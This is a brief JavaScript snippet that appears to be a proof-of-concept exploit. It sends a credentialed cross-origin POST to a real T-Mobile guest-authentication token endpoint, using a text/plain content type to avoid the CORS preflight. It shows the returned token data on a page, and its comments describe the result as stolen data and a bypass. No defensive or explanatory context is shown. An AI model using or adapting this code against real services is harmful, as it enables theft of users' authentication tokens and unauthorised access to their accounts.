// We use text/plain to avoid the OPTIONS preflight bouncer
fetch('https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens', {
    method: 'POST',
    mode: 'cors',
    credentials: 'include',
    headers: {
        'Content-Type': 'text/plain' // This is the secret to bypassing the OPTIONS failure
    },
    body: '{}' 
})
.then(response => {
    // If this works, we will see the stolen data even if the OPTIONS failed before
    console.log("Stolen Headers:", response.headers.get('Access-Control-Allow-Origin'));
    return response.json();
})
.then(data => {
    document.getElementById('output').innerText = JSON.stringify(data, null, 2);
})
.catch(err => {
    document.getElementById('output').innerText = "Bypass Failed: " + err;
});
